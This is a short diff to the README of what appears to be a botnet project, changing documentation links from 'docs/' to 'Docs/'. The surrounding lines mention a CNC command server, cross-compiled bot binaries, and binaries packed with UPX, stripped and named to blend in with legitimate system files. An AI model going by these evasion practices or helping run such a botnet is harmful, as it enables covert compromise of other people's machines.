@@ -85,7 +85,7 @@ screen ./server --split
 # Detach from screen: Ctrl+A then D
 # Reattach: screen -r
 ```
-[COMMANDS.md](docs/COMMANDS.md) | **Complete CNC command reference**  
+[COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  
 
 Bot binaries are automatically cross-compiled to `bot/bins/`.
 
@@ -128,9 +128,9 @@ All binaries are UPX-packed, stripped, and named to blend with legitimate system
 
 | File                    | Description                                      |
 |-------------------------|--------------------------------------------------|
-| [USAGE.md](docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
-| [COMMANDS.md](docs/COMMANDS.md) | Complete CNC command reference              |
-| [CHANGELOG.md](docs/CHANGELOG.md) | Version history and breaking changes         |
+| [USAGE.md](Docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
+| [COMMANDS.md](Docs/COMMANDS.md) | Complete CNC command reference              |
+| [CHANGELOG.md](Docs/CHANGELOG.md) | Version history and breaking changes         |
 
 ## 🛣️ Roadmap
 
